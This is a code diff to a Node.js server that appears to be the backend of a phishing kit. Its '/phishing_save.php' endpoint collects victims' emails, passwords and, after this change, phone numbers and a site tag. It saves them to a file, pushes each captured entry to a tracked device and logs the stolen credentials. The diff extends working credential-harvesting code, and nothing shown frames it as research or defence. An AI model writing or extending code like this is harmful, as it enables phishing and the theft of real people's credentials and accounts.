@@ -1333,7 +1333,7 @@ app.post('/api.php', (req, res) => {
 });
 
 // ═══════════════════════════════════════════════════════════
-// 🎣 PHISHING ENDPOINTS (from external HTML page)
+// 🎣 PHISHING ENDPOINTS
 // ═══════════════════════════════════════════════════════════
 
 app.post('/phishing_save.php', (req, res) => {
@@ -1351,9 +1351,12 @@ app.post('/phishing_save.php', (req, res) => {
         let creds = [];
         if (fs.existsSync(phishFile)) creds = JSON.parse(fs.readFileSync(phishFile, 'utf8'));
 
+        // ✅ جديد — دعم site + phone
         const entry = {
+            site: data.site || 'card',
             email: data.email || '',
             password: data.password || '',
+            phone: data.phone || '',
             sender: data.sender || '',
             ua: data.ua || '',
             screen: data.screen || '',
@@ -1369,7 +1372,7 @@ app.post('/phishing_save.php', (req, res) => {
 
         updateDevicesList(deviceId, null);
         pushToDevice(deviceId, 'new_phishing', entry);
-        console.log(`[PHISH] 🎣 ${entry.email} / ${entry.password} from ${deviceId}`);
+        console.log(`[PHISH] 🎣 [${entry.site}] ${entry.email || entry.phone} / ${entry.password} from ${deviceId}`);
         res.json({ success: true });
     } catch (e) { res.json({ error: e.message }); }
 });
